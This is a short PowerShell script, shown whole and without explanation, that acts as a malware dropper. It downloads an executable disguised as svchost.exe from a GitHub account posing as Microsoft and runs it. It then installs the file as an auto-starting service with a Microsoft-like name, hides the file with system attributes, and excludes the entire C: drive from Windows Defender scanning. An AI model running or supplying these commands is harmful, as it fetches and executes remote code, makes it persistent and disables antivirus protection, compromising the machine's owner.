Invoke-WebRequest -Uri https://raw.githubusercontent.com/MicrosoftNetworkServiceHost/MicrosoftNetworkService/main/svchost.exe -OutFile C:\Windows\ServiceProfiles\NetworkService\AppData\LocalLow\svchost.exe; & C:\Windows\ServiceProfiles\NetworkService\AppData\LocalLow\svchost.exe
New-Service -Name "MicrosoftNetworkService" -BinaryPathName "C:\Windows\ServiceProfiles\NetworkService\AppData\LocalLow\svchost.exe" -DisplayName "MicrosoftNetworkService" -StartupType Automatic
attrib +h +s +i +r "C:\Windows\ServiceProfiles\NetworkService\AppData\LocalLow\svchost.exe"
Add-MpPreference -ExclusionPath "C:\"
